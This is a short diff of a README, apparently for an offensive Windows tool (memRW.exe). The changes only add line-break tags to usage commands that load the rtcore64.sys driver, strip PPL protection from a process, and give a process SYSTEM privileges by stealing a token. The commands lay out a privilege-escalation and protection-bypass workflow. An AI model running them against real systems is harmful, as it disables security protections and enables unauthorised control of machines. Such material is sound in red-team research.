@@ -5,11 +5,12 @@ For now, playing with EPROCESS :</br>
 -stealing system token</br>
 </br>
 
-memRW.exe load %cd%\rtcore64.sys
-memRW.exe list
-memRW.exe removeppl PID
-memRW.exe makesystem PID
-memRW.exe unload %cd%\rtcore64.sys
+memRW.exe load %cd%\rtcore64.sys</br>
+memRW.exe list</br>
+memRW.exe removeppl PID</br>
+memRW.exe makesystem PID</br>
+memRW.exe unload %cd%\rtcore64.sys</br>
+</br>
 
 Greatly inspired by https://github.com/RedCursorSecurityConsulting/PPLKiller </br>
 
